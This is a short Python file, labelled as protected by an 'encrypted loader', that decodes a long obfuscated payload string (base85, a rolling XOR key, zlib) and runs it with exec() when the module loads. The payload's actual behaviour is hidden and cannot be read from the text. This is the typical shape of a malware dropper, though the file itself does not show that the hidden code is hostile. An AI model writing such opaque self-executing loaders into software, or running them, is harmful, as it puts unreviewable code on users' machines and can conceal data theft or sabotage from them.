# -*- coding: utf-8 -*-
# Protected by Javis Universal Dynamic Encrypted Loader
import base64 as _b85, zlib as _zl
def _xload(_s, _k):
    _e = _b85.b85decode(_s)
    _o = bytearray()
    _p = 0xAA
    _kl = len(_k)
    for _i, _b in enumerate(_e):
        _o.append(_b ^ (_k[_i % _kl] ^ _p))
        _p = _b
    return _zl.decompress(bytes(_o))

_KEY = b'javis_universal_dynamic_loader_2026_'
_PAYLOAD = "xC00^Cl|Qpn-RKaoJlIgvAy#fH3eo8eI0Bm4O_4ne1jH@QlG^6OSnNs(A&tklB+ILa=Ip|3KY1WYxfheZu}L6h<L%foTJ>L3NhhQ#izc{%5h5g&F?K=Uy<KsLZu?QvHnIh+hdRl#rj>qR`lx_0cx3{n7(c6S~-ts%@JeZyX9OP?Q=s1V$LN`B6Mha!rKaAR7OH;P`sAhF2P_fsD+LWRncW|=&0n`reCuE?h(p0O{~cLzGb6!@cl1w_1yLMV-DeyX-Tx<3?LaIO?Hi%g9`|@bGFBevq1ep#3y6j3Q9LBU<oy&_fzNou*ZWL(3sVVAreD2$W)=pkzAX4VGw#(%s3uDywYqyEf5p(myOQ|T|A&g%iU;@)Y}ShOGpM{g{cMbmuc6>X0suldS%aj$3kO?pwuPsIGL>IZ<dlHE-7@PXun!jC@-3oaXD`^8h<fQl3v7E=@+Kdd?+k+AuV039AC#_9l!E69GO(}n@b#Wu=WsgXWIpoe8p7SsdPR%EpFz`Cl87NUY{h_SmYG(vn~=8Q$m0pG>VOVqG+u20gGg@4nl>3OFz9*5nw`)EYR58(Pxu>O;C{*TXpe1UT7EV66;v9(6S}(#WO-82pl5$PnLt=skSa{?HH?W(UgRl-XIkf3iF5K>e)bRlQQ(`jhcm@!nT!PS3dvLb28W6le{%{-TT;~ANA@fiu^lNOlv@2&~on?YG3xQ>hwTwi;wkmGwfTxkmeyJ-QVbSSwKT;ZdwGFK-w_*0PNVf2d-^zr@wbx_5d^$qAUgUaTVT#`jotB^_`#BN`cFQ*@Z~;ru!&|!dUvYeUibIray27_*AiKkR%l&^3(=8pwE>MagA$4&6`_14yM-Utbhuv`Tz+OMozo"
exec(compile(_xload(_PAYLOAD, _KEY), __file__, "exec"), globals())
